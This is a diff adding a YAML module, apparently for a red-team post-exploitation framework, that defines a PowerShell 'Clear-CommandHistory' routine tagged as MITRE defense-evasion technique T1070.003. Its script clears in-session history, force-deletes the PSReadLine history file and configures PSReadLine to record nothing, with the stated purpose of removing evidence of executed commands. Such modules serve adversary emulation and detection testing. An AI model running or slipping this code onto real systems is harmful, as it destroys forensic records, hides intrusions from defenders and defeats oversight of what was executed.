@@ -1,0 +1,56 @@
+name: Clear-CommandHistory
+authors:
+  - name: Anthony Rose
+    handle: '@Cx01N'
+    link: https://twitter.com/Cx01N_
+description: |
+  Clears PowerShell command history to remove evidence of executed
+  commands. Performs multiple cleanup actions including clearing the
+  current session history with Clear-History, removing the PSReadLine
+  history file from disk, and configuring PSReadLine to stop saving
+  history for the current session. This covers both the in-memory
+  command history and the persistent history file that PSReadLine
+  maintains across sessions.
+software: ''
+tactics: [TA0005]
+techniques: [T1070.003]
+background: true
+output_extension:
+needs_admin: false
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments:
+  - https://github.com/redcanaryco/atomic-red-team
+options:
+  - name: OutputFunction
+    description: PowerShell output function to use.
+    required: false
+    value: 'Out-String'
+    suggested_values:
+      - Out-String
+      - ConvertTo-Json
+script: |
+  function Clear-CommandHistory {
+      # Clear current session history
+      Clear-History
+
+      # Remove PSReadLine history file
+      $historyPath = (Get-PSReadlineOption).HistorySavePath
+      if ($historyPath -and (Test-Path $historyPath)) {
+          Remove-Item $historyPath -Force
+          Write-Output "[+] Removed PSReadLine history file: $historyPath"
+      } else {
+          Write-Output "[*] No PSReadLine history file found."
+      }
+
+      # Prevent history from being saved this session
+      Set-PSReadlineOption -HistorySaveStyle SaveNothing
+
+      # Set AddToHistoryHandler to prevent logging
+      Set-PSReadLineOption -AddToHistoryHandler { return $false }
+
+      Write-Output "[+] Session history cleared."
+      Write-Output "[+] PSReadLine configured to not save history."
+  }
+script_end: Clear-CommandHistory {{ PARAMS }} | {{ OUTPUT_FUNCTION }}
